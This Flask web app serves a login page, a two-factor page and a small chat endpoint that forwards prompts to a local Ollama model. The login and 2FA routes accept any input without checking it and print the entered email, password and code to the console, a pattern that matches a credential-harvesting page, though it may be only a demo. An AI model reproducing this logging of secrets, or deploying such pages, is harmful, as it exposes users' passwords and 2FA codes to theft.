from flask import Flask, render_template, redirect, url_for, request, jsonify
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        print(f"Login Attempt: Email={email}, Password={password}")
        return redirect(url_for('two_factor'))
    return render_template('L1.html')

@app.route('/2fa', methods=['GET', 'POST'])
def two_factor():
    if request.method == 'POST':
        code = request.form.get('code')
        print(f"2FA Code Entered: {code}")
        return redirect(url_for('home'))
    return render_template('2fat.html')

@app.route('/home')
def home():
    return render_template('home.html')

@app.route('/pfai')
def pfai():
    return render_template('PFAI.html')

@app.route('/features')
def features():
    return render_template('features.html')

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/ask', methods=['POST'])
def ask_ollama():
    data = request.get_json()
    prompt = data.get('prompt', '')

    payload = {
        "model": "llama3.2:1b",  # Ensure this matches your local model name
        "prompt": prompt,
        "stream": False
    }

    try:
        response = requests.post("http://localhost:11434/api/generate", json=payload)
        response.raise_for_status()  # Raises error if status code is 4xx or 5xx
        result = response.json()

        ai_text = result.get("response", "").strip()
        return jsonify({"response": ai_text if ai_text else "No response generated."})
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Request failed: {e}"}), 500
    except Exception as e:
        return jsonify({"error": f"Unexpected error: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)
